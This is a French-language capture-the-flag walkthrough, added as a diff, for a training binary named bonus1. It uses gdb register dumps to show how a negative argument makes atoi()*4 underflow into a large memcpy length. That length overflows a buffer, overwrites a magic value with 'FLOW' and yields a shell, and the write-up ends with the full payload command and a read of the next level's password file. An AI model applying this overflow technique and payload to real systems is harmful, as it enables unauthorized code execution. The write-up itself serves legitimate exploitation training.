@@ -1,0 +1,46 @@
+Bonus1:
+
+On lance le programme. Ca segv. On lance avec des arguments aleatoires, cela ne segv plus. On lance le programme avec gdb. On disas le main. On voit un atoi. Le programme fait ensuite une comparaison entre notre arguement et 9. On relance donc avec le programme avec 9. Ca segv. En gros avec tout ce qui est inferieur a 9 ca segv pas. On regarde sous le jump et on voit plusieurs choses interessantes, notament un memcpy qui prend en argument un buffer adjacant en memoire au retour de atoi (EAX), argv[2] (EDX), ainsi que le retour de atoi * 4 (EXC). Une comparaison est faite ensuite avec un nombre tres grand (1464814662) et si le resultat est bon lance un shell (execl).
+
+On met un breakpoint dans le main en-dessous du memcpy. b* main+73.	On lance avec r -3000 `python -c 'print "A" * 128'` et on dump les registres:
+
+eax            0xbffff5b4	-1073744460
+ecx            0xffffd120	-12000
+edx            0xbffff7c5	-1073743931
+ebx            0xb7fd0ff4	-1208152076
+esp            0xbffff5a0	0xbffff5a0
+ebp            0xbffff5e8	0xbffff5e8
+esi            0x0	0
+edi            0x0	0
+eip            0x8048473	0x8048473 <main+79>
+eflags         0x200282	[ SF IF ID ]
+cs             0x73	115
+ss             0x7b	123
+ds             0x7b	123
+es             0x7b	123
+fs             0x0	0
+gs             0x33	51
+
+On voit que ecx (3 args de la fonction) contient -12000 et que donc effectivement la multiplication par 4 fonctionne. Le but va etre d'underflow en utilisant un nombre plus grand.
+r -2000000000 `python -c 'print "A" * 128'`:
+
+eax            0xbffff5b4	-1073744460
+ecx            0x2329b000	589934592
+edx            0xbffff7c5	-1073743931
+ebx            0xb7fd0ff4	-1208152076
+esp            0xbffff5a0	0xbffff5a0
+ebp            0xbffff5e8	0xbffff5e8
+esi            0x0	0
+edi            0x0	0
+eip            0x8048473	0x8048473 <main+79>
+eflags         0x200282	[ SF IF ID ]
+cs             0x73	115
+ss             0x7b	123
+ds             0x7b	123
+es             0x7b	123
+fs             0x0	0
+gs             0x33	51
+
+EXC vient d'underflow. Pour s'approcher de la valeur que l'on veut on va utiliser la valeur maximale d'un unsigned int / 4. Cela ne suffit pas pour underflow. On tente avec la valeur d'un uint / 4. ECX contient alors la valeur 4. On se rapproche ! En soustrayant 50 a notre argument on obtient 204 dans le registre. On peut donc aller genere une chaine de 204 caracteres. On lance, on recupere l'adresse du segv 0x39624138. On regarde l'offset de 56. Moins la taille de notre chiffre (11), moins la taille de l'adresse, il reste 40 caracteres a ecrire.
+
+On genere donc le payload avec ./bonus1 -1073741773 `python -c 'print "A" * 40 + "\x46\x4c\x4f\x57"'`. On cat /home/user/bonus2/.pass et on passe au niveau suivant.
